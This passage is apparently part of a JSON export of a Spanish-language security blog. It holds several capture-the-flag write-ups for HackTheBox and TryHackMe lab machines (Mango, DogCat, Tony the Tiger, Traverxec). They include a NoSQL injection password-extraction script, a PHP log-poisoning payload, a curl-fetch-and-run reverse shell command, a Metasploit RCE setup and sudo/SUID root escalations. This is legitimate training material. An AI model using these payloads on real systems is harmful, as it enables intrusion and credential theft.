que conocemos todo esto, traemos localmente el puerto 52846 utilizando SSH, visitamos la pagina y nos muestra un panel de logeo.\nSSH:\n1  ssh -L 8080:localhost:52846 jimmy@10.10.10.171   Netstat:\nPanel:\nIngresamos las credenciales que obtuvimos en el archivo index, y nos muestra una clave privada de SSH encryptada.\nUtilizamos john the ripper para crackear la frase e iniciar sesion con la clave privada.\nFrase:bloodninjas SSH Joanna:\nObtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Utilizamos sudo para ver los comandos que podemos utilizar sin contraseña, vemos que nano es uno de ellos, con la ayuda de GTFOBbins - nano obtenemos una shell commo root y con ello nuestra flag root.txt.\nBTW Podemos agregar nuestra clave publica al archivo authorized_keys del usuario root e iniciar sesion con nuestra clave privada.\n","description":"","id":32,"section":"posts","tags":["windows"],"title":"Hack The Box - OpenAdmin","uri":"https://sckull.github.io/posts/openadmin/"},{"content":"Mango es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Mango     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.162   Maker MrR3boot    MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  root@aoiri:~/htb/mango# masscan -p1-65535,U:1-65535 10.10.10.162 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-31 00:09:30 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.162 Discovered open port 22/tcp on 10.10.10.162 # Nmap 7.80 scan initiated Mon Dec 30 17:45:13 2019 as: nmap -p- --min-rate 1000 -o nmap_scan 10.10.10.162 Warning: 10.10.10.162 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.162 Host is up (0.34s latency). Not shown: 65531 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https 45463/tcp filtered unknown # Nmap done at Mon Dec 30 17:46:57 2019 -- 1 IP address (1 host up) scanned in 103.79 seconds # Nmap 7.80 scan initiated Mon Dec 30 18:09:24 2019 as: nmap -sV -sC -p22,80,443,45436 -o nmap_scan_sc 10.10.10.162 Nmap scan report for 10.10.10.162 Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 45436/tcp closed unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Dec 30 18:09:56 2019 -- 1 IP address (1 host up) scanned in 32.05 seconds   HTTP Al visitar el puerto 80 nos muestra que no tenemos permisos para ver el contenido.\nGOBUSTER - HTTP Busqueda de directorios y archivos con gobuster.\n1 2  root@aoiri:~/htb/mango# gobuster dir -u http://10.10.10.162/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 15 -q -x php,html,txt /server-status (Status: 403)   HTTPS En el puerto 443, nos muestra una pagina tipo buscador.\nGOBUSTER - HTTPS Busqueda de directorios y archivos con gobuster.\n1 2 3 4 5  root@aoiri:~/htb/mango# gobuster dir -u https://10.10.10.162/ -w /usr/share/wordlists/dirb/common.txt -t 35 -q -x php,html,txt -k /analytics.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /server-status (Status: 403)   /analytics.php Encontramos una pagina con una funcionalidad de tabla de \u0026lsquo;excel\u0026rsquo;.\nSSLSCAN Utilizamos sslscan para verificar el certificado de la pagina, encontramos un dominio el cual agregamos a /etc/hosts.\nVisitamos la pagina del dominio nuevo (https) pero nos muestra la misma pagina que la ip en https, pero no muestra lo mismo en http.\nNuevamente ejecutamos gobuster pero no encontramos nada interesante en los directorios.\n1 2 3 4 5 6  root@aoiri:~/htb/mango# gobuster dir -u http://staging-order.mango.htb/ -w /usr/share/wordlists/dirb/common.txt -q -x txt,html,php -t 15 /home.php (Status: 302) /index.php (Status: 200) /index.php (Status: 200) /server-status (Status: 403) /vendor (Status: 301)   USER - MongoDB NoSQL Capturamos los datos que se envian al iniciar sesion en el panel intentando encontrar una vulnerabilidad del tipo sql injection, pero ninguno de los parametros era vulnerable. Intentamos con NoSQL Injection dentro de burpsuite:\nParametros:\nusername[$ne]=sckull\u0026amp;password[$ne]=sckull\u0026amp;login=login Inyeccion NoSQL - Burpsuite Utilizamos burpsuite para obtener la contraseña y longitud de ella del usuario mango (asumiendo que mango es un usuario), para conocer la longitud de la contraseña utilizamos el payload, reemplazando el numero 0 por un numero mayor hasta que el resultado de la solicitud sea 200, en el caso del usuario mango la longitud de la contraseña puede ser \u0026gt;= 16 caracteres:\n1  username=mango\u0026amp;password[$regex]=.{16}\u0026amp;login=login   Utilizando el siguiente payload donde el 0 es reemplazado por otro hasta que la respuesta de nuestra solicitud sea Codigo 302 que significa que la expresion regular que le estamos pasando esta haciendo match con la contraseña:\nusername=mango\u0026amp;password[$regex]=^0\u0026amp;login=login Vemos que el inicio de la contraseña es h:\nModificamos nuevamente nuestro parametro en password:\nusername=mango\u0026amp;password[$regex]=^h§0§\u0026amp;login=login Haciendo el mismo procedimiento cada vez que encontremos una solicitud 302, hasta obtener la contraseña completa:\nmango:h3mXK8RhU~f{]f5H Tambien podemos utilizar el script que PayloadAllTheThings tiene en NoSQL Injection, modificando un poco el codigo para adaptarlo a esta maquina quedaria de esta forma:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  import requests import urllib3 import string import urllib urllib3.disable_warnings() #username=\u0026#34;mango\u0026#34; password=\u0026#34;\u0026#34; u=\u0026#34;http://staging-order.mango.htb/index.php\u0026#34; headers = {\u0026#39;application\u0026#39; : \u0026#39;x-www-form-urlencoded\u0026#39;} while True: for c in string.printable: if c not in [\u0026#39;*\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;?\u0026#39;,\u0026#39;|\u0026#39;]: payload={\u0026#39;username[$eq]\u0026#39;:\u0026#39;mango\u0026#39;, \u0026#39;password[$regex]\u0026#39;: \u0026#39;^%s\u0026#39; %(password + c), \u0026#39;login\u0026#39;: \u0026#39;login\u0026#39; } #print payload r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if r.status_code == 302: #print \u0026#34;For check the payload ...\u0026#34; #print payload  print(\u0026#34;Found one more char : %s\u0026#34; % (password+c)) password += c   Obtuvimos la contraseña del usuario mongo pero no pudimos iniciar sesion en el panel, nos redirige al index, utilizamos las credenciales en el servicio ssh y logramos obtener una shell.\nDentro de los servicios de la maquina encontramos que esta corriendo mongo en el puerto 27017.\nUtilizando la shell de mongo pudimos obtener las credenciales del usuario admin.\nCambiamos de usuario y obtuvimos nuestra flag user.txt.\nPRIVILEGE ESCALATION Enumeramos los ficheros SUID para tomar ventaja de estos, encontramos que existe en la maquina jjs, utilizamos GTFOBINS para obtener una shell. Modificamos sh por bash, ya que nos da un error al intentar ejecutar comandos.\n1  echo \u0026#34;Java.type(\u0026#39;java.lang.Runtime\u0026#39;).getRuntime().exec(\u0026#39;/bin/bash -pc \\$@|bash\\${IFS}-p _ echo bash -p \u0026lt;$(tty)\u0026gt;$(tty)2\u0026gt;$(tty)\u0026#39;).waitFor()\u0026#34; | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs   Obtuvimos nuestra shell con privilegios root y nuestra flag root.txt.\n","description":"","id":33,"section":"posts","tags":["linux"],"title":"Hack The Box - Mango","uri":"https://sckull.github.io/posts/mango/"},{"content":"DogCat es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo DogCat     Info I made a website where you can look at pictures of dogs and/or cats!   Puntos 335   Dificultad Media   Maker jammy    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (445) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # Nmap 7.80 scan initiated Fri Apr 17 20:42:19 2020 as: nmap -T5 -sV -sC -p- -o nmap_scan dogcat.thm Warning: dogcat.thm giving up on port because retransmission cap hit (2). Nmap scan report for dogcat.thm Host is up (0.15s latency). Not shown: 65497 closed ports, 36 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA) | 256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA) |_ 256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: dogcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 17 20:52:58 2020 -- 1 IP address (1 host up) scanned in 639.73 seconds   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  root@upset:~/tools/Kadimus# gobuster dir -u http://dogcat.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 45 -x php,html,txt /index.php (Status: 200) /cat.php (Status: 200) /flag.php (Status: 200) /cats (Status: 301) /dogs (Status: 301) /dog.php (Status: 200)   HTTP Encontramos una pagina sencilla en el puerto 80, que al darle click a la opcion de perro (dog) nos muestra una imagen.\nVemos que en la url le pasa por parametro la palabra dog. Dentro del escaneo de GOBUSTER vimos que existe un archivo cat y dog con extension en php, al ver el codigo fuente de ambas paginas y al recargar por repetidas ocaciones la imagen que genera junto al codigo html es distinta.\nPor lo que cada vez que se selecciona la opcion de dog o cat, nos muéstra distintas imagenes.\nLFI - CAT OR DOG Intentamos utilizar LFI basico (/etc/passwd, /var/log/apache2/access.log, etc) pero no logramos leer ninguno de los archivos ya que la pagina nos mostraba el mensaje Sorry, only dogs or cats are allowed..\nLo curioso de este reto es que, al pasarle la palabra cat dentro de una peticion de un archivo o lo que fuera, nos mostraba el mensaje Here you go! y un error de la funcion include(). Desde aqui tiene un poco de sentido el mensaje de error anterior (Sorry, only dogs or cats are allowed.) podemos utilizar tanto dog o cat dentro de las peticiones para que sean aceptadas.\nUtilizamos php://filter/convert.base64-encode/dog/resource=ARCHIVO para leer archivos, en este caso leemos el archivo index.php que es el que utiliza ?view=, logramos obtener el archivo en base64.\nLogramos obtener el codigo fuente de index.php, logramos ver que hay una funcion que verifica si existe cat o dog dentro de la peticion, tambien vemos que podemos enviarle como parametro una extension de lo contrario la tomara como .php.\n **ALERTA DE SPOILER** `SPOILER` `SPOILER` `SPOILER` 1 2 3 4 5 6 7 8 9 10 11 12 13 14  \u0026lt;?php function containsStr($str, $substr) { return strpos($str, $substr) !== false; } $ext = isset($_GET[\u0026#34;ext\u0026#34;]) ? $_GET[\u0026#34;ext\u0026#34;] : \u0026#39;.php\u0026#39;; if(isset($_GET[\u0026#39;view\u0026#39;])) { if(containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;dog\u0026#39;) || containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;cat\u0026#39;)) { echo \u0026#39;Here you go!\u0026#39;; include $_GET[\u0026#39;view\u0026#39;] . $ext; } else { echo \u0026#39;Sorry, only dogs or cats are allowed.\u0026#39;; } } ?\u0026gt;    Leemos el archivo flag.php y logramos leer nuestra primera flag.\nRCE - Apache Log Poisoning Utilizamos el User-Agent para poder ejecutar nuestro codigo php el que tendra como objetivo obtener y ejecutar un comando que le pasemos. Utilizamos php://filter/dog/resource=../../../../var/log/apache2/access.log\u0026amp;ext= para leer el archivo log, además de esto agregamos el comando que deseamos ejecutar en la maquina \u0026amp;cmd=whoami, por lo que luciría de la siguiente forma.\nApache Log Poisoning\n1 2 3  GET /?view=php://filter/dog/resource=../../../../var/log/apache2/access.log\u0026amp;ext=\u0026amp;cmd=whoami HTTP/1.1 Host: dogcat.thm User-Agent:Mozilla/5.0 \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; Gecko/20100101 Firefox/68.0   Vemos que en la respuesta tenemos acceso como usuario www-data.\nUSER - WWW-DATA Ahora, creamos un archivo que contenga una shell inversa para descargarlo mediante un servidor de python (python3 -m http.server 80) en la maquina.\nComando para descargar y ejecutar nuestra shell (Codificamos a URL los espacios)\n1 2 3 4  bash -c \u0026#34;$(curl -s 10.8.6.160/shell.sh)\u0026#34; #Codificado bash%20-c%20%20\u0026#34;$(curl%20-s%2010.8.6.160/shell.sh)\u0026#34;   Logramos obtener una shell con el usuario www-data.\nNuestra segunda flag.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando env. Utilizamos env para obtener una shell root.\n1  sudo /usr/bin/env /bin/sh   Òbtenemos nuestra shell como usuario root y nuestra tercera flag.\nTenemos privilegio root pero vemos que estamos limitados de comandos y vemos en la raiz de la maquina que existe un archivo .dockerenv por lo que en el lugar que estamos es un contenedor.\nDentro de la carpeta /opt/backup encontramos una carpeta que contiene dos archivos un bash y un tar, los cuales se utilizaron para crear el contenedor (backup.tar), vemos que el archivo bash descomprimer el archivo tar dentro de /root/container. Agregamos un ping hacia nuestra maquina en el archivo y logramos obtener paquetes en tcpdump.\nTCPDUMP\nPodemos deducir que existe un crontab que ejecuta el archibo backup.sh, ahora, agregamos una shell inversa a este archivo y ponemos a la escucha netcat en nuestra maquina y esperamos a que nos devuelva una shell.\nSHELL\nNETCAT\nLogramos obtener una shell y nuestra ultima flag.\nCrontab del archivo backup.sh\n","description":"","id":34,"section":"posts","tags":["linux"],"title":"TryHackMe - DogCat","uri":"https://sckull.github.io/posts/dogcat/"},{"content":"Tony the Tiger es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Tony the Tiger     Info Learn how to use a Java Serialisation attack in this boot-to-root   Puntos 240   Dificultad Facil   Maker cmnatic    NMAP Escaneo de puertos tcp, escaneo con nmap muestra el puerto http (80), http (8080), el puerto ssh (22) abiertos, entre otros puertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123  # Nmap 7.80 scan initiated Fri Apr 17 19:53:10 2020 as: nmap -sV -sC -o nmap_scan 10.10.91.15 Nmap scan report for 10.10.91.15 Host is up (0.20s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA) | 2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA) | 256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA) |_ 256 f6:36:07:3c:3b:3d:71:30:c4💿2a:13:00:b5:25:ae (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-generator: Hugo 0.66.0 |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Tony\u0026amp;#39;s Blog 1090/tcp open java-rmi Java RMI |_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug) 1091/tcp open java-rmi Java RMI 1098/tcp open java-rmi Java RMI 1099/tcp open java-object Java Object Serialization | fingerprint-strings: | NULL: | java.rmi.MarshalledObject| | hash[ | locBytest | objBytesq | #http://thm-java-deserial.home:8083/q | org.jnp.server.NamingServer_Stub | java.rmi.server.RemoteStub | java.rmi.server.RemoteObject | xpwA | UnicastRef2 |_ thm-java-deserial.home 4446/tcp open java-object Java Object Serialization 5500/tcp open hotline? | fingerprint-strings: | DNSStatusRequestTCP: | DIGEST-MD5 | NTLM | GSSAPI | CRAM-MD5 | thm-java-deserial | DNSVersionBindReqTCP: | DIGEST-MD5 | NTLM | CRAM-MD5 | GSSAPI | thm-java-deserial | GenericLines, NULL: | CRAM-MD5 | DIGEST-MD5 | GSSAPI | NTLM | thm-java-deserial | GetRequest: | NTLM | GSSAPI | DIGEST-MD5 | CRAM-MD5 | thm-java-deserial | HTTPOptions, TLSSessionReq: | DIGEST-MD5 | CRAM-MD5 | NTLM | GSSAPI | thm-java-deserial | Help: | NTLM | GSSAPI | CRAM-MD5 | DIGEST-MD5 | thm-java-deserial | Kerberos: | CRAM-MD5 | DIGEST-MD5 | NTLM | GSSAPI | thm-java-deserial | RPCCheck: | DIGEST-MD5 | CRAM-MD5 | GSSAPI | NTLM | thm-java-deserial | RTSPRequest: | CRAM-MD5 | GSSAPI | DIGEST-MD5 | NTLM | thm-java-deserial | SSLSessionReq: | GSSAPI | CRAM-MD5 | NTLM | DIGEST-MD5 | thm-java-deserial | TerminalServerCookie: | CRAM-MD5 | GSSAPI | NTLM | DIGEST-MD5 |_ thm-java-deserial 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: | Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS | Potentially risky methods: PUT DELETE TRACE |_ See https://nmap.org/nsedoc/scripts/ajp-methods.html 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 | http-methods: |_ Potentially risky methods: PUT DELETE TRACE |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache-Coyote/1.1 |_http-title: Welcome to JBoss AS 8083/tcp open http JBoss service httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). 3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1099-TCP:V=7.80%I=7%D=4/17%Time=5E9A4F92%P=x86_64-pc-linux-gnu%r(NU ... [ snip ] ... Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 17 19:54:24 2020 -- 1 IP address (1 host up) scanned in 73.17 seconds   HTTP Encontramos una pagina corriendo en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  root@upset:~/thm/tonythetiger# gobuster dir -u http://10.10.91.15 -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /404.html (Status: 200) /categories (Status: 301) /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /page (Status: 301) /posts (Status: 301) /server-status (Status: 403) /sitemap.xml (Status: 200) /tags (Status: 301)   En la pagina encontramos una imagen, la descargamos y utilizamos strings para buscar nuestra flag.\nHTTP 8080 Encontramos una pagina corriendo en el puerto 8080.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10  root@upset:~/thm/tonythetiger# gobuster dir -u http://10.10.91.15:8080 -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt,jsp /css (Status: 302) /favicon.ico (Status: 200) /images (Status: 302) /index.html (Status: 200) /index.html (Status: 200) /jbossws (Status: 302) /jmx-console (Status: 302) /manager (Status: 302) /WEB-INF (Status: 302)   JBoss - JexBoss Tool Como pudimos ver en la pagina en el puerto 8080 esta corriendo JBoss, y vemos la version en /jbossws/.\nUtilizamos Jexboss para verificar si la maquina es vulnerable y automatizar un ataque. Nos muestra que tiene varias vulnerabilidades.\nMientras nuestra herramienta verifica las vulnerabilidades, tambien nos da la opcion de explotar la maquina, en este caso utilizamos JMXInvokerServlet para obtener una shell inversa, ingresando nuestra IP y el puerto que tenemos a la escucha con Netcat.\nNetcat\nUSER - CMNATIC Logramos obtener una shell inversa con el usuario cmnatic y nuestra flag user.txt en la carpeta principal de jboss.\nUSER - JBOSS En la carpeta de este usuario encontramos una nota en la que contiene una contraseña, al utilizarla en el servicio de SSH logramos obtener una shell.\nSSH\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando find. Utilizamos find para obtener una shell root.\n![image](/images/posts/thm/tonythetiger/Screenshot from 2020-04-17 18.43.56.webp)\nFind\nLogramos obtener una shell root, econtramos nuestra ultima flag root.txt pero al parecer esta codificada.\nAl decodificar nuestra flag nos devuelve un hash, utilizamos crackstation para obtener el texto.\nCrackstation\n","description":"","id":35,"section":"posts","tags":["linux"],"title":"TryHackMe - Tony the Tiger","uri":"https://sckull.github.io/posts/tonythetiger/"},{"content":"Traverxec es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Traverxec     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.165   Maker jkr    MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp, nmap y masscan nos muestran el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  root@aoiri:~/htb/traverxec# masscan -p1-65535,U:1-65535 10.10.10.165 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-30 05:12:44 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.165 Discovered open port 80/tcp on 10.10.10.165 # Nmap 7.80 scan initiated Sun Dec 29 23:09:53 2019 as: nmap -p- --min-rate 1000 -o nmap_scan 10.10.10.165 Nmap scan report for 10.10.10.165 Host is up (0.28s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Sun Dec 29 23:12:05 2019 -- 1 IP address (1 host up) scanned in 132.10 seconds # Nmap 7.80 scan initiated Sun Dec 29 23:12:40 2019 as: nmap -sV -sC -p22,80 -o nmap_scan_pr 10.10.10.165 Nmap scan report for 10.10.10.165 Host is up (0.080s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68💿41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Dec 29 23:13:00 2019 -- 1 IP address (1 host up) scanned in 19.96 seconds   HTTP - Puerto 80 Nos muestra una pagina web de una persona.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2 3 4 5 6 7 8 9 10  root@aoiri:~/htb/traverxec# gobuster dir -u http://10.10.10.165/ -w /usr/share/wordlists/dirb/common.txt -x html,txt,php -t 15 -q /css (Status: 301) /empty.html (Status: 200) /icons (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /lib (Status: 301) /Readme.txt (Status: 200)   WHATWEB Utilizamos esta herramienta para concoer que tipo de webserver esta corriendo en el puerto 80.\nNOSTROMO - RCE Buscamos si existe una vulnerabilidad para este webserver encontramose una y es del tipo RCE (cve-2019-16278). Utilizamos metasploit para configurarlo, obtenemos una shell con el usuario www-data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70  msf5 \u0026gt; use exploit/multi/http/nostromo_code_exec msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; show options Module options (exploit/multi/http/nostromo_code_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic (Unix In-Memory) msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; set rhosts 10.10.10.165 rhosts =\u0026gt; 10.10.10.165 msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; set lhost tun0 lhost =\u0026gt; 10.10.14.67 msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; show options Module options (exploit/multi/http/nostromo_code_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.165 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.67 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic (Unix In-Memory) msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; run   USER - David Realizamos una enumeracion de los directorios en la maquina encontramos un archivo (.httpasswd) en el directorio de nostromo que contiene una contraseña encriptada en md5crypt.\nDesencriptamos la contraseña con john pero al intentar utilizarla en ssh no funcionó.\nJohn:\nSSH:\nEn el mismo directorio encontramos un archivo de configuracion de nostromo en el que esta definido ciertos parametros para el webserver.\nnhttpd.conf\nSegun la documentacion, los parametros definidos con homedirs son las carpetas de usuarios que pueden ser accedidos a traves de HTTP utilizando ~nombreUsuario en la url.\n1 2 3 4  # HOMEDIRS [OPTIONAL] homedirs\t/home homedirs_public\tpublic_www   En el caso de nuestra maquina podemos acceder a la carpeta del usuario david con ~david.\nComo podemos observar podemos acceder a la carpeta del usuario david, más no por medio de una shell ya que no tenemos los permisos suficientes, de igual forma existe otro parametro homedirs_public esta carpeta definida esta dentro de la carpeta de homedirs definida anteriormente, por lo que podemos acceder a esta desde nuestro navegador y desde nuestra shell.\nVemos que hay un backup de ssh, accedemos desde nuestro navegador a la carpeta /~david/protected-file-area/, nos pedira una contraseña y un usuario, utilizamos las credenciales crackeadas anteriormente y podemos ver y descargar el archivo.\nUtilizamos la clave privada para iniciar sesion, pero esta, esta protegida encriptada, utilizamos ssh2john para obtener el hash y crackear la frase, luego de esto usamos la frase con el usuario david y la llave privada atraves de ssh y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Dentro de la carpeta de David encontramos un archivo bash que ejecuta ciertos binarios o comandos del sistema, pero vemos que journalctl es ejecutado junto a sudo y cat. Intentamos enumerar los ficheros que pueden ser ejecutados junto a sudo con el usuario David pero no tenemosla contraseña de este.\n1  /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat   Para obtener una shell, ejecutamos sudo con journalctl tal y como se ejecuta en el archivo bash, luego de eso escribimos !/bin/sh y obtenemos shell con usuario root y nuestra flag root.txt.\nSegun Gtfobins al ejecutar journalctl, este, ejecuta lo que parece ser less, por lo que pudimos abrir una shell con el comando !/bin/sh.\n","description":"","id":36,"section":"posts","tags":["linux"],"title":"Hack The Box - 